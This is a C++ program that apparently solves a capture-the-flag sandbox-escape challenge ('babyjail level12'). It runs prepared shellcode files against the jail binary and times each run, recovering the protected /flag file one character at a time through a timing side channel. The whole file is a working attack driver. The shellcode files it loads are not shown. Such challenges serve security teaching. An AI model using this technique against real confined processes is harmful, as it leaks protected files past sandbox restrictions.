#include <unistd.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <cstdio>
#include <cstdlib>
#include <ctime>
#include <cmath>
#include <chrono>

int main(void)
{
    FILE * fp = fopen("flag", "a");

    for (int i = 0; i < 100; i++)
    {
        for (int j = 33; j < 128; j++)
        {
            int ret;
            char compile[200];
            std::chrono::milliseconds ms;
            sprintf(compile, "/babyjail_level12_teaching1 /flag < ./new_shellcode/new_shellcode_%d_%d_raw", i, j);

            do {
                auto begin = std::chrono::high_resolution_clock::now();
                ret = system(compile);
                auto end = std::chrono::high_resolution_clock::now();

                auto duration = end - begin;
                ms = std::chrono::duration_cast<std::chrono::milliseconds>(duration);
            } while (ret == 34304);

            //printf("ret value: %d\n", ret);
            int result = (int) round(ms.count() / 1000.0);
            if (result > 5)
            {
                fputc(j, fp);
                printf("The result of index %d is %c!!\n\n", i, j);
                break;
            }
            else
            {
                printf("The result of index %d is not %c, which is %d in decimal.\n", i, j, j);
            }

            fflush(NULL);
            //sleep(1);
        }
    }
    
    fclose(fp);
    return 0;
}